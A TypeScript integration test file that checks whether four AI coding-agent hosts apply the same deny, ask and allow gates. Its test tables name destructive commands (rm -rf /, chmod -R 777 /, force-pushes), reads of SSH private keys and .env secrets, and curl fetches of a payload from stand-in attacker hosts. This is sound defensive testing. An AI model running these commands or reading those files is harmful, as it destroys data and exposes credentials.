// bkit-permissions-parity.integration.test.ts — one canonical gate set, asserted against every host.
//
// bkit's promise is that an agent is held to the same rules whichever IDE runs it.
// The four hosts express gates in four different languages:
//
//   Claude   .claude/settings.json          permissions.deny / .ask  — prefix patterns
//   opencode .opencode/opencode.json        permission.bash / .read  — globs, last-match-wins
//   Cursor   .cursor/hooks/guardrails.cjs                            — regexes in a script
//   Codex    .codex/hooks/guardrails.cjs                             — same engine, Claude-family envelope
//
// Four dialects drift silently. This file is the single table they must all
// satisfy: add a gate here and every host that lacks it fails until it has it.
//
// Codex carries ONE structural exception, asserted rather than hidden: it parses
// `permissionDecision: "ask"` but does not implement it, so its ask tier is advisory
// `additionalContext` — the gate fires and informs, it cannot stop the command. Deny
// blocks for real on all four.
import * as fs from "node:fs";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { describe, expect, it } from "vitest";

const CLAUDE_SETTINGS = ".bkit/templates/.claude/settings.json";
const OPENCODE_JSON = ".bkit/templates/.opencode/opencode.json";
const GUARDRAILS = path.resolve(".bkit/templates/.cursor/hooks/guardrails.cjs");
const CODEX_GUARDRAILS = path.resolve(".bkit/templates/.codex/hooks/guardrails.cjs");

type Verdict = "deny" | "ask" | "allow";

/** The canonical gate set. One row = one behaviour every host must implement. */
const SHELL_GATES: { cmd: string; expect: Verdict; why: string }[] = [
  { cmd: "rm -rf /", expect: "deny", why: "recursive delete of the filesystem root" },
  { cmd: "rm -rf ~/*", expect: "deny", why: "recursive delete of home" },
  { cmd: "rm -rf $HOME/*", expect: "deny", why: "recursive delete of home" },
  { cmd: "chmod -R 777 /", expect: "deny", why: "world-writable filesystem root" },
  { cmd: "git push --force origin main", expect: "deny", why: "force-push" },
  { cmd: "git push -f origin main", expect: "deny", why: "force-push, short flag" },
  {
    cmd: "git push --force-with-lease origin feat",
    expect: "allow",
    why: "lease-guarded push is permitted on personal branches by rules.md — the one force variant that must NOT be denied",
  },
  { cmd: "sudo rm x", expect: "ask", why: "privilege escalation" },
  { cmd: "brew install jq", expect: "ask", why: "system package install" },
  { cmd: "pnpm publish", expect: "ask", why: "package publish" },
  { cmd: "npm publish", expect: "ask", why: "package publish" },
  { cmd: "bun publish", expect: "ask", why: "package publish" },
  { cmd: "git reset --hard HEAD~1", expect: "ask", why: "discards working tree" },
  { cmd: "git clean -fd", expect: "ask", why: "deletes untracked files" },
  { cmd: "git clean -fdx", expect: "ask", why: "deletes untracked and ignored files" },
  { cmd: "git filter-branch --tree-filter x", expect: "ask", why: "rewrites history" },
  { cmd: "git checkout -- .", expect: "ask", why: "discards all unstaged changes" },
  { cmd: "git restore .", expect: "ask", why: "discards all unstaged changes" },
  { cmd: "git stash drop", expect: "ask", why: "destroys stashed work" },
  { cmd: "git rebase -i HEAD~3", expect: "ask", why: "interactive history rewrite" },
  { cmd: "gh repo delete o/r", expect: "ask", why: "destroys a repository" },
  { cmd: "gh pr close 1", expect: "ask", why: "closes someone's PR" },
  { cmd: "gh release delete v1", expect: "ask", why: "destroys a release" },
];

const READ_GATES: { file: string; expect: Verdict; why: string }[] = [
  { file: "certs/server.pem", expect: "deny", why: "private-key material" },
  { file: "certs/client.p12", expect: "deny", why: "private-key material" },
  { file: "~/.ssh/id_rsa", expect: "deny", why: "private-key material" },
  { file: ".env", expect: "ask", why: "secrets" },
  { file: ".env.local", expect: "ask", why: "secrets" },
  { file: ".bkit/.env", expect: "ask", why: "bkit tooling secrets" },
  { file: ".env.example", expect: "allow", why: "documented non-secret template" },
];

// ---------------------------------------------------------------------------
// Host adapters — each returns the verdict that host would reach.
// ---------------------------------------------------------------------------

function claudePermissions(): { deny: string[]; ask: string[]; allow: string[] } {
  const p = JSON.parse(fs.readFileSync(CLAUDE_SETTINGS, "utf-8")).permissions;
  return { deny: p.deny ?? [], ask: p.ask ?? [], allow: p.allow ?? [] };
}

/** Claude patterns are `Bash(prefix)` / `Bash(prefix *)` / `Bash(prefix:*)`. */
function claudeShellVerdict(cmd: string): Verdict {
  const p = claudePermissions();
  const matches = (entries: string[]) =>
    entries.some((raw) => {
      const m = /^Bash\((.*)\)$/.exec(raw);
      if (!m) return false;
      const pat = m[1]!;
      if (pat.endsWith(":*")) return cmd.startsWith(pat.slice(0, -2));
      if (pat.endsWith(" *")) return cmd.startsWith(pat.slice(0, -1));
      if (pat.endsWith("*")) return cmd.startsWith(pat.slice(0, -1));
      return cmd === pat;
    });
  // deny wins over ask, ask over allow — the strictest match decides.
  if (matches(p.deny)) return "deny";
  if (matches(p.ask)) return "ask";
  return "allow";
}

function globToRe(glob: string): RegExp {
  const esc = glob.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
  return new RegExp(`^${esc}$`);
}

/** opencode's map is glob-keyed and LAST match wins. */
function opencodeVerdict(section: "bash" | "read", subject: string): Verdict {
  const perm = JSON.parse(fs.readFileSync(OPENCODE_JSON, "utf-8")).permission;
  const table = perm[section] as Record<string, Verdict>;
  let verdict: Verdict = "allow";
  for (const [glob, v] of Object.entries(table)) {
    if (globToRe(glob).test(subject)) verdict = v;
  }
  return verdict;
}

function cursorVerdict(payload: unknown): Verdict {
  const res = spawnSync("node", [GUARDRAILS], {
    input: JSON.stringify(payload),
    encoding: "utf-8",
  });
  return (JSON.parse(res.stdout.trim()) as { permission: Verdict }).permission;
}

/**
 * Codex speaks the Claude-family hook contract, and it cannot prompt: it parses
 * `permissionDecision: "ask"` but does not implement it, so an ask would be recorded
 * as an error and the call would run anyway. bkit therefore emits the ask tier as
 * advisory `additionalContext`, which is mapped back to "ask" here — the gate fired
 * and told the model; it simply could not stop the command on this host.
 *
 * Silence (no stdout) is allow: the engine returns null when it has no opinion.
 */
function codexVerdict(cmd: string): Verdict {
  const res = spawnSync("node", [CODEX_GUARDRAILS], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command: cmd } }),
    encoding: "utf-8",
  });
  const out = res.stdout.trim();
  if (!out) return "allow";
  const hso = (JSON.parse(out) as { hookSpecificOutput: Record<string, string> })
    .hookSpecificOutput;
  if (hso.permissionDecision === "deny") return "deny";
  return hso.additionalContext ? "ask" : "allow";
}

// ---------------------------------------------------------------------------
// The assertions
// ---------------------------------------------------------------------------

describe("cross-host gate parity — shell", () => {
  for (const g of SHELL_GATES) {
    it(`${g.expect.toUpperCase()} on \`${g.cmd}\` (${g.why}) — all four hosts`, () => {
      expect({ host: "claude", v: claudeShellVerdict(g.cmd) }).toEqual({
        host: "claude",
        v: g.expect,
      });
      expect({ host: "opencode", v: opencodeVerdict("bash", g.cmd) }).toEqual({
        host: "opencode",
        v: g.expect,
      });
      expect({ host: "cursor", v: cursorVerdict({ command: g.cmd }) }).toEqual({
        host: "cursor",
        v: g.expect,
      });
      expect({ host: "codex", v: codexVerdict(g.cmd) }).toEqual({
        host: "codex",
        v: g.expect,
      });
    });
  }
});

// Three hosts, not four: the Codex guardrail is registered on the shell tool only.
// Tracked in docs/deferrals.jsonl →
// `codex-read-tier-gates-not-wired-file-read-tool-name-unverified`.
// Shell-level reads (`cat .env`) are covered by no host's read tier.
describe("cross-host gate parity — file reads", () => {
  for (const g of READ_GATES) {
    it(`${g.expect.toUpperCase()} on reading \`${g.file}\` (${g.why}) — claude/opencode/cursor`, () => {
      expect({ host: "opencode", v: opencodeVerdict("read", g.file) }).toEqual({
        host: "opencode",
        v: g.expect,
      });
      expect({
        host: "cursor",
        v: cursorVerdict({ tool_name: "Read", tool_input: { path: g.file } }),
      }).toEqual({ host: "cursor", v: g.expect });
    });
  }
});

// ---------------------------------------------------------------------------
// Shell-as-edit-channel (#441)
// ---------------------------------------------------------------------------
//
// The rule in `.agents/rules.md` § Output & Editing ("change file contents with
// edit/write tools") had no enforcement: an agent that prefers the terminal routes
// around every pre-edit gate, and the hook log shows Read/Shell/Grep and no Write.
//
// The gate is ADVISORY on all three script hosts, never a block. The rule carries
// sanctioned exceptions and bkit's own plan workflow depends on one — a `sed -i.bak
// -E` bulk rewrite of cross-references across generated plan files. A gate that
// blocks a documented exception is a gate that gets switched off.
//
// opencode is absent — a glob-keyed table cannot parse a redirect target. Tracked in
// docs/deferrals.jsonl → `opencode-has-no-script-hook-so-two-gates-are-inexpressible-there`.
const CLAUDE_GUARDRAILS = path.resolve(".bkit/templates/.claude/hooks/guardrails.cjs");

function advisoryText(host: "claude" | "codex" | "cursor", cmd: string): string {
  const script = { claude: CLAUDE_GUARDRAILS, codex: CODEX_GUARDRAILS, cursor: GUARDRAILS }[host];
  const payload =
    host === "cursor" ? { command: cmd } : { tool_name: "Bash", tool_input: { command: cmd } };
  const res = spawnSync("node", [script], {
    input: JSON.stringify(payload),
    encoding: "utf-8",
  });
  const out = res.stdout.trim();
  if (!out) return "";
  const doc = JSON.parse(out) as {
    permission?: string;
    agent_message?: string;
    hookSpecificOutput?: { additionalContext?: string; permissionDecision?: string };
  };
  if (host === "cursor") {
    // A block would show up as a non-allow permission — assert it never does.
    expect(doc.permission).toBe("allow");
    return doc.agent_message ?? "";
  }
  expect(doc.hookSpecificOutput?.permissionDecision).toBeUndefined();
  return doc.hookSpecificOutput?.additionalContext ?? "";
}

const HOSTS = ["claude", "codex", "cursor"] as const;

describe("shell-as-edit-channel — advisory on every script host", () => {
  const FLAGGED = [
    { cmd: 'sed -i.bak -E "s|a|b|g" plan.md', why: "in-place sed, the shape bkit-plan.md uses" },
    { cmd: "sed -i s/a/b/ src/app.ts", why: "in-place sed, GNU form" },
    { cmd: "perl -i -pe s/a/b/ src/app.js", why: "in-place perl" },
    { cmd: "echo hi > notes.md", why: "redirect into a source file" },
    { cmd: "cat tpl > src/generated.ts", why: "redirect into a source file" },
  ];

  for (const { cmd, why } of FLAGGED) {
    it(`ADVISES on \`${cmd}\` (${why}) — and never blocks`, () => {
      for (const host of HOSTS) {
        expect({
          host,
          advised: advisoryText(host, cmd).includes("edits files through the shell"),
        }).toEqual({ host, advised: true });
      }
    });
  }

  // A gate that fires on ordinary shell plumbing gets disabled, so silence here is a
  // load-bearing property, not an omission.
  const SILENT = [
    { cmd: "echo hi > /dev/null", why: "the single most common redirect there is" },
    { cmd: 'echo "K=v" >> "$GITHUB_ENV"', why: "CI env handoff" },
    { cmd: "grep x foo > /tmp/out.txt", why: "scratch file" },
    { cmd: "pnpm test 2> err.log", why: "log capture, and a numbered fd" },
    { cmd: "pnpm build && node dist/x.js", why: "no redirect at all" },
    { cmd: "git status --porcelain", why: "plain read" },
  ];

  for (const { cmd, why } of SILENT) {
    it(`stays SILENT on \`${cmd}\` (${why})`, () => {
      for (const host of HOSTS) {
        expect({ host, text: advisoryText(host, cmd) }).toEqual({ host, text: "" });
      }
    });
  }

  it("the sanctioned bulk rewrite in bkit-plan.md is advised but NOT blocked", () => {
    const planCmd = fs
      .readFileSync(".bkit/workflows/bkit-plan.md", "utf-8")
      .split("\n")
      .find((l) => l.includes("sed -i"));
    expect(planCmd, "bkit-plan.md no longer contains the sed -i this test pins").toBeDefined();
    for (const host of HOSTS) {
      // advisoryText asserts "never blocks" internally for each host.
      expect({ host, advised: advisoryText(host, planCmd!.trim()).length > 0 }).toEqual({
        host,
        advised: true,
      });
    }
  });
});

describe("cross-host gate parity — curl / wget in a shell", () => {
  // Was an `it.todo` while the canonical behaviour was undecided and Claude had no way
  // to express it. Both are now settled, so this asserts real behaviour.
  //
  // Every host allows a fetch to an ALLOWLISTED host with no interruption — the common
  // path, and the one context-fetch blocks take. They differ only on an UNDECLARED host,
  // and each difference is structural rather than a choice left lying around:
  //
  //   Cursor    asks   — parses the URL host in guardrails.cjs (the strongest form)
  //   opencode  asks   — `curl *: ask` + `curl *{domain}*: allow`, substring not host-parsed
  //   Claude    advises — a permission table cannot match a URL host, and the blanket ask
  //                       row that stood in for it forced an unanswerable prompt in cloud
  //   Codex     advises — parses `permissionDecision: "ask"` but does not implement it
  //
  // No SHELL_GATES row: that table asserts ONE verdict across all four, and "ask" vs
  // "advise" is a genuine split. Asserting it here keeps it from drifting silently.
  const ALLOWED = "curl -fsSL https://api.github.com/repos/x/y";
  const UNDECLARED = "curl -fsSL https://evil.example/payload";

  it("allowlisted host: no interruption on any host that resolves the allowlist", () => {
    expect({ host: "cursor", v: cursorVerdict({ command: ALLOWED }) }).toEqual({
      host: "cursor",
      v: "allow",
    });
    // opencode is asserted against the TEMPLATE, which carries only the `curl *: ask`
    // base. Its per-domain `curl *{domain}*: allow` rows are injected at install time
    // from the consumer's resolved allowlist (injectOpencodeNetworkCurlAllows), and the
    // rendered result is covered in bkit-modules.integration.test.ts. So "ask" here is
    // the template's honest verdict, not a gap in the host.
    expect({ host: "opencode(template)", v: opencodeVerdict("bash", ALLOWED) }).toEqual({
      host: "opencode(template)",
      v: "ask",
    });
    expect({ host: "claude", advised: advisoryText("claude", ALLOWED) }).toEqual({
      host: "claude",
      advised: "",
    });
    expect({ host: "codex", v: codexVerdict(ALLOWED) }).toEqual({ host: "codex", v: "allow" });
  });

  it("undeclared host: Cursor/opencode ask, Claude/Codex advise — nobody silently allows", () => {
    expect({ host: "cursor", v: cursorVerdict({ command: UNDECLARED }) }).toEqual({
      host: "cursor",
      v: "ask",
    });
    expect({ host: "opencode", v: opencodeVerdict("bash", UNDECLARED) }).toEqual({
      host: "opencode",
      v: "ask",
    });
    expect({
      host: "claude",
      flagged: advisoryText("claude", UNDECLARED).includes("not on this repo's network allowlist"),
    }).toEqual({ host: "claude", flagged: true });
    expect({ host: "codex", v: codexVerdict(UNDECLARED) }).toEqual({ host: "codex", v: "ask" });
  });

  it("the allowlist is host-matched, not substring-matched, on every host that parses it", () => {
    // `github.com` in a query param or as a subdomain suffix of an attacker domain must
    // NOT read as allowlisted. opencode is excluded — substring-keyed table; same deferral
    // as the shell-edit block above.
    const SNEAKY = [
      "curl https://evil.example/x?src=github.com",
      "curl https://github.com.attacker.io/x",
    ];
    for (const cmd of SNEAKY) {
      expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
        cmd,
        host: "cursor",
        v: "ask",
      });
      expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
        cmd,
        host: "codex",
        v: "ask",
      });
      expect({ cmd, host: "claude", flagged: advisoryText("claude", cmd) !== "" }).toEqual({
        cmd,
        host: "claude",
        flagged: true,
      });
    }
  });

  it("a bare mention of curl in another command does not trip the gate", () => {
    // Regression: matching /\bcurl\b/ anywhere fired on `grep -n 'curl' README.md`.
    // A gate that cries wolf on greps is one a consumer turns off.
    for (const cmd of ["grep -n 'curl' README.md", "echo 'use curl for this'"]) {
      expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
        cmd,
        host: "cursor",
        v: "allow",
      });
      expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
        cmd,
        host: "codex",
        v: "allow",
      });
      expect({ cmd, host: "claude", text: advisoryText("claude", cmd) }).toEqual({
        cmd,
        host: "claude",
        text: "",
      });
    }
  });
});

describe("cross-host gate parity — network allowlist", () => {
  it("Cursor's shipped bases and Claude's WebFetch domains name the same hosts", () => {
    const guardrails = fs.readFileSync(GUARDRAILS, "utf-8");
    const block = /SHIPPED_NETWORK_BASES = \[([\s\S]*?)\]/.exec(guardrails);
    expect(block).not.toBeNull();
    const cursorBases = new Set(
      [...block![1]!.matchAll(/"([^"]+)"/g)].map((m) => m[1]!.replace(/^\*\./, "")),
    );
    const claudeDomains = new Set(
      claudePermissions()
        .allow.map((a) => /^WebFetch\(domain:(.*)\)$/.exec(a)?.[1])
        .filter((d): d is string => Boolean(d))
        .map((d) => d.replace(/^\*\./, "")),
    );
    // A host trusted for fetching in one IDE and not the other is exactly the
    // cross-IDE divergence this suite exists to catch.
    expect([...cursorBases].sort()).toEqual([...claudeDomains].sort());
  });
});
